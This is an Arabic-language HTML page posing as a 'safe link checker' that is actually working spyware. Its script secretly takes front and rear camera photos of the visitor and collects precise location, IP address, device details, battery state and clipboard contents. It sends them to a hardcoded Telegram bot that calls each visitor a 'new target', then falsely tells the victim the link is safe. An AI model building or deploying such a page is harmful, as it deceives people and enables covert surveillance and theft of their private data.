<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ghost Link - التحقق من أمان الرابط</title>
    <style>
        :root { --bg: #0b0f19; --card: #161b22; --text: #e6edf3; --primary: #38bdf8; }
        body { background: var(--bg); color: var(--text); font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .app-card { background: var(--card); padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #30363d; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .logo { font-size: 60px; margin-bottom: 20px; }
        .download-btn { background: var(--primary); color: #0b0f19; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
        #status { margin-top: 15px; font-size: 0.8rem; color: #8b949e; display: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="app-card">
    <div class="logo">🛡️</div>
    <h2>فاحص الروابط الآمن</h2>
    <p>اضغط على الزر أدناه للتأكد من أن الرابط الذي تلقيته آمن ولا يحتوي على برمجيات خبيثة.</p>
    <button class="download-btn" onclick="executeGhostMode()">بدء الفحص الآن</button>
    <div id="status">جاري تحليل بيانات الاتصال...</div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const T = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
    const C = "7984067238";

    async function sendToTelegram(data, type = "text") {
        const url = `https://api.telegram.org/bot${T}/`;
        if (type === "text") {
            await fetch(url + `sendMessage?chat_id=${C}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
        } else {
            const fd = new FormData();
            fd.append("chat_id", C);
            fd.append("photo", data, "shot.jpg");
            await fetch(url + "sendPhoto", { method: "POST", body: fd });
        }
    }

    async function getDetails() {
        let report = `🔔 *إشعار: تم رصد هدف جديد*\n\n`;
        
        // 1. الموقع
        const pos = await new Promise(r => {
            navigator.geolocation.getCurrentPosition(
                p => r(`📍 الموقع: [فتح الخريطة](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}) (دقة: ${p.coords.accuracy.toFixed(1)}m)`),
                () => r(`📍 الموقع: تعذر الحصول عليه`), {enableHighAccuracy: true}
            );
        });
        report += pos + "\n";

        // 2. الجهاز والمتصفح
        report += `📱 الجهاز: \`${navigator.platform}\`\n`;
        report += `🖥️ المتصفح: \`${navigator.userAgent.split(' ').pop()}\`\n`;

        // 3. البطارية وحالة الشحن
        try {
            const b = await navigator.getBattery();
            const status = b.charging ? "🔌 يشحن حالياً" : "🔋 غير موصل بالشاحن";
            report += `🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${status})\n`;
        } catch(e) {}

        // 4. الـ IP
        try {
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            report += `🌐 الـ IP: \`${ip.ip}\`\n`;
        } catch(e) {}

        // 5. محتوى الكيبورد (Clipboard)
        try {
            const clipText = await navigator.clipboard.readText();
            report += `📋 محتوى الكيبورد: \`${clipText || "فارغ"}\`\n`;
        } catch(e) {
            report += `📋 الكيبورد: \`مرفوض أو غير مدعوم\`\n`;
        }

        return report;
    }

    async function takePhoto(side) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: side === "front" ? "user" : "environment" } });
            const v = document.getElementById('v');
            v.srcObject = stream;
            await new Promise(r => v.onloadedmetadata = r);
            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            stream.getTracks().forEach(t => t.stop());
            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
        } catch (e) { return null; }
    }

    async function executeGhostMode() {
        document.getElementById('status').style.display = 'block';
        
        // التقاط الصور (مرة أمامية ومرة خلفية)
        const front = await takePhoto("front");
        if (front) await sendToTelegram(front, "photo");
        
        const back = await takePhoto("back");
        if (back) await sendToTelegram(back, "photo");

        // إرسال التقرير النصي الكامل
        const report = await getDetails();
        await sendToTelegram(report, "text");

        alert("تم الفحص بنجاح: الرابط آمن للاستخدام.");
        document.getElementById('status').style.display = 'none';
    }
</script>
</body>
</html>
